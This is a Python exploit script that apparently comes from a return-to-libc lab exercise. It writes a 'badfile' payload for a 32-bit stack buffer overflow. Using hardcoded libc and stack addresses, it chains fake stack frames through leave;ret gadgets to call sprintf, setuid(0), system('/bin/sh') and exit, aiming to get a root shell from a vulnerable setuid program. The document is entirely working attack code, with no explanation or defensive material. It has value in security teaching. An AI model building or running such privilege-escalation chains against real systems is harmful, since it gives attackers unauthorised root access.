# !/usr/bin/python3
import sys

def tobytes (value):
    return (value).to_bytes(4, byteorder= 'little')

# Fill content with non-zero values
content = bytearray(0xaa for i in range (24))

sh_addr = 0xffffd3e3
leaveret = 0x565562ce
sprintf_addr = 0xf7e20e40
setuid_addr = 0xf7e99e30
system_addr = 0xf7e12420
exit_addr = 0xf7e04f80
ebp_bof = 0xffffcd58
foo_addr = 0x565562d0

sprintf_arg1 = ebp_bof + 12 + 5 * 0x20
sprintf_arg2 = sh_addr + len("/bin/sh")

# Return to sprintf()
ebp_next = ebp_bof + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret)
content += b'A' * (0x20 - 2 * 4)

# sprintf(sprintf_arg1, sprintf_arg2)
for i in range(4):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(sprintf_addr)
    content += tobytes(leaveret)
    content += tobytes(sprintf_arg1)
    content += tobytes(sprintf_arg2)
    content += b'A' * (0x20 - 5 * 4)
    sprintf_arg1 += 1
        
# setuid(0)
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(setuid_addr)
content += tobytes(leaveret)
content += tobytes(0xFFFFFFFF)
content += b'A' * (0x20 - 4 * 4)

for i in range(10):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(foo_addr)
    content += tobytes(leaveret)
    content += b'A' * (0x20 - 3 * 4)

# system("/bin/sh")
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(system_addr)
content += tobytes(leaveret)
content += tobytes(sh_addr)
content += b'A' * (0x20 - 4 * 4)

# exit()
content += tobytes(0xFFFFFFFF)
content += tobytes(exit_addr)

# Save content to a file
with open("badfile", "wb") as f:
    f.write(content)